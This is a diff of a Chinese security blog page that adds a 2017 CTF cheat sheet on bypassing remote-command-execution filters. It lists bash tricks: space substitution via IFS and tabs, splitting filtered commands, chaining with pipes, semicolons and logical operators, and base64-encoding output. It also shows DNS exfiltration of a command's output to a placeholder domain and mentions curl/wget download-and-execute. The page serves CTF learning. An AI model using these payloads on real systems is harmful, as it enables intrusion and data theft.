@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="CTF, Sec, 安全" />
+  <meta name="keywords" content="CTF,Sec," />
 
 
 
@@ -84,12 +84,16 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Stop Here">
-<meta property="og:url" content="http://www.leommxj.com/index.html">
+<meta name="description" content="最近在几个ctf比赛中遇到好几次远程命令执行绕过的题，网上资料比较零散，做一下整理。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE Bypass 远程命令执行绕过技巧">
+<meta property="og:url" content="http://www.leommxj.com/2017/06/11/RCE-Bypass/index.html">
 <meta property="og:site_name" content="Stop Here">
+<meta property="og:description" content="最近在几个ctf比赛中遇到好几次远程命令执行绕过的题，网上资料比较零散，做一下整理。">
+<meta property="og:updated_time" content="2017-06-11T08:29:43.194Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Stop Here">
+<meta name="twitter:title" content="RCE Bypass 远程命令执行绕过技巧">
+<meta name="twitter:description" content="最近在几个ctf比赛中遇到好几次远程命令执行绕过的题，网上资料比较零散，做一下整理。">
 
 
 
@@ -107,7 +111,7 @@
   };
 </script>
 
-  <title> Stop Here </title>
+  <title> RCE Bypass 远程命令执行绕过技巧 | Stop Here </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -138,9 +142,7 @@
     
   
 
-  <div class="container one-collumn sidebar-position-left 
-   page-home 
- ">
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -237,9 +239,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
   
@@ -259,10 +261,7 @@
             
             
               
-                
-                <a class="post-title-link" href="/2017/06/11/RCE-Bypass/" itemprop="url">
-                  RCE Bypass 远程命令执行绕过技巧
-                </a>
+                RCE Bypass 远程命令执行绕过技巧
               
             
           </h1>
@@ -321,262 +320,74 @@
       
 
       
-        
-          <p>最近在几个ctf比赛中遇到好几次远程命令执行绕过的题，网上资料比较零散，做一下整理。</p>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2017/06/11/RCE-Bypass/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
+        <p>最近在几个ctf比赛中遇到好几次远程命令执行绕过的题，网上资料比较零散，做一下整理。</p>
+<a id="more"></a>
+<h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><p>ctf中RCE的绕过主要是靠linux中bash命令的一些特性和用法，下面从几种不同的过滤情况说明.</p>
+<h2 id="过滤了空格"><a href="#过滤了空格" class="headerlink" title="过滤了空格"></a>过滤了空格</h2><p>过滤空格的情况可以通过利用重定向符、IFS、其他字符代替、{,}等方法进行绕过<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">cat&lt;&gt;test.txt //重定向符</div><div class="line">cat<span class="variable">$&#123;IFS&#125;</span>text.txt //IFS</div><div class="line">cat%09test.txt //其他字符代替</div><div class="line">&#123;cat,test.txt&#125; //&#123;,&#125;</div></pre></td></tr></table></figure></p>
+<p>实际情况可能会比较复杂，比如过滤了空格和花括号，那样逗号和IFS的方法就不可行。或者过滤了逗号和重定向符，就利用IFS和%09。灵活运用。</p>
+<h2 id="过滤命令或特殊字符"><a href="#过滤命令或特殊字符" class="headerlink" title="过滤命令或特殊字符"></a>过滤命令或特殊字符</h2><p>如果过滤了某个命令，可以利用命令拼接、插入空字符串或者反单引号来绕过<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//假设过滤了ls</div><div class="line"></div><div class="line">a=l;b=s;<span class="variable">$a</span><span class="variable">$b</span> //拼接</div><div class="line"></div><div class="line">l<span class="string">''</span>s //插入空字符串</div><div class="line">l<span class="string">""</span>s //也是插入空字符串</div><div class="line"></div><div class="line">l``s //反单引号</div></pre></td></tr></table></figure></p>
+<p>这个也有很多灵活的变种，比如第一种拼接方法，如果过滤了分号，可以利用<code>%0a</code>及类似的字符来代替分号。</p>
+<p><code>a=l%0ab=s%0a$a$b</code></p>
+<p>有时候会遇到过滤文件名内容的，可以通过正则来绕过。比如flag在flag.php中但是句点被过滤了，可以构造<br><code>cat fla*</code><br>这种形式来绕过。</p>
+<h2 id="需要多条命令执行"><a href="#需要多条命令执行" class="headerlink" title="需要多条命令执行"></a>需要多条命令执行</h2><p>常见于命令执行的可控位置在某个命令之后，比如<code>ping x.x.x.x</code>这个x.x.x.x可控。我们可以通过使用管道、逻辑运算符、分号以及刚才提过的%0a编码的回车来绕过<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ping x.x.x.x|ls //管道</div><div class="line">ping x.x.x.x;ls //分号</div><div class="line"></div><div class="line">ping x.x.x.x&amp;&amp;ls //第一个命令执行返回值正常，第二个命令才执行</div><div class="line">ping x.x.x.x||ls //如果第一个命令执行返回值正常，第二个命令就不执行了</div></pre></td></tr></table></figure></p>
+<h2 id="限制回显"><a href="#限制回显" class="headerlink" title="限制回显"></a>限制回显</h2><h3 id="回显中有限制"><a href="#回显中有限制" class="headerlink" title="回显中有限制"></a>回显中有限制</h3><p>某些特殊字符在输出的时候检测到了就会不回显,比如换行符。这种情况可以通过base64或者16进制等编码绕过。<br><code>ls|base64</code></p>
+<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>无回显可以通过curl、ping、wget等命令与Cloudeye、eye.io等结合或者发起dns查询或者http请求来获取内容。<br>比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ping `ls|base64`.xxxx.com</div></pre></td></tr></table></figure></p>
+<h2 id="直接下载执行"><a href="#直接下载执行" class="headerlink" title="直接下载执行"></a>直接下载执行</h2><p>有时候过滤了某些字符，但是可以直接curl或者wget到脚本执行。<br>这种如果过滤了句点可以尝试将ip转换成十六进制格式，但是需要放行<code>http://</code></p>
+
+      
+    </div>
+
+    <div>
+      
         
       
     </div>
 
     <div>
       
-    </div>
+        
 
-    <div>
       
     </div>
 
     <footer class="post-footer">
       
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/02/08/AlexCTF-Writeup/" itemprop="url">
-                  AlexCTF-Writeup
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2017-02-08T16:44:08+08:00" content="2017-02-08">
-              2017-02-08
-            </time>
-          </span>
-
+        <div class="post-tags">
           
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Sec/" itemprop="url" rel="index">
-                    <span itemprop="name">Sec</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Sec/Writeup/" itemprop="url" rel="index">
-                    <span itemprop="name">Writeup</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
+            <a href="/tags/CTF/" rel="tag">#CTF</a>
           
-
-          
-            
-          
-
-          
-
-          
-          
-
+            <a href="/tags/Sec/" rel="tag">#Sec</a>
           
         </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          <p>一个由埃及亚历山大大学的学生俱乐部<a href="https://twitter.com/MSTCAlex">MSP Teach Club</a>组织的CTF比赛,办得不错。第一次参加外国的CTF比赛，感觉出题的有些思路跟国内真是不一样。由于运维难度比赛主办没出PWN和WEB的题:D.最后还是有几道题没做出来，看各种大神全做完也是很心累。</p>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2017/02/08/AlexCTF-Writeup/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/02/08/AlexCTF-Writeup/" rel="next" title="AlexCTF-Writeup">
+                <i class="fa fa-chevron-left"></i> AlexCTF-Writeup
+              </a>
+            
           </div>
-        
-      
-    </div>
 
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
+          <div class="post-nav-prev post-nav-item">
             
-            
-              
-                
-                <a class="post-title-link" href="/2017/02/08/hello-world/" itemprop="url">
-                  hello_world
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2017-02-08T16:44:00+08:00" content="2017-02-08">
-              2017-02-08
-            </time>
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
+          </div>
         </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"print '略略略略'"</span></div></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -584,6 +395,12 @@
 
 
           
+  <div class="comments" id="comments">
+    
+            <div id="uyan_frame"></div>
+    
+  </div>
+
 
         </div>
         
@@ -603,8 +420,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel  sidebar-panel-active ">
+      <section class="site-overview sidebar-panel ">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/avatar.jpg"
@@ -654,6 +480,17 @@
 
       </section>
 
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Bypass"><span class="nav-number">1.</span> <span class="nav-text">Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#过滤了空格"><span class="nav-number">1.1.</span> <span class="nav-text">过滤了空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过滤命令或特殊字符"><span class="nav-number">1.2.</span> <span class="nav-text">过滤命令或特殊字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#需要多条命令执行"><span class="nav-number">1.3.</span> <span class="nav-text">需要多条命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#限制回显"><span class="nav-number">1.4.</span> <span class="nav-text">限制回显</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#回显中有限制"><span class="nav-number">1.4.1.</span> <span class="nav-text">回显中有限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无回显"><span class="nav-number">1.4.2.</span> <span class="nav-text">无回显</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#直接下载执行"><span class="nav-number">1.5.</span> <span class="nav-text">直接下载执行</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
       
 
     </div>
@@ -750,6 +587,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
 
   
 
@@ -772,6 +613,10 @@
     
 
    
+        <!-- UY BEGIN -->
+        <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2136197"></script>
+        <!-- UY END -->
+    
   
   
   
